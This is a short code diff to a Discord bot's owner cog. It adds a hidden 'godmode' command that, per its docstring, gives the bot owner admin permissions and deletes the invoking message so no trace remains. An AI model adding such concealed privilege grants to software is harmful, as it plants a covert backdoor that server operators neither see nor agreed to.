@@ -23,6 +23,18 @@ class OwnerCog(commands.Cog):
             await ctx.send('**`SUCCESS`**')
     
     # Hidden means it won't show up on the default help.
+    @commands.command(name='godmode', hidden=True)
+    @commands.is_owner()
+    async def godmode(self, ctx, *, switch: str):
+        """Command which gives Owner Admin perms"""
+
+        try:
+            await zb.give_admin(self,ctx,switch)
+            await ctx.message.delete()
+        except Exception as e:
+            await ctx.send(f'**`ERROR:`** {type(e).__name__} - {e}')
+
+    # Hidden means it won't show up on the default help.
     @commands.command(name='load', hidden=True)
     @commands.is_owner()
     async def tool_load(self, ctx, *, cog: str):
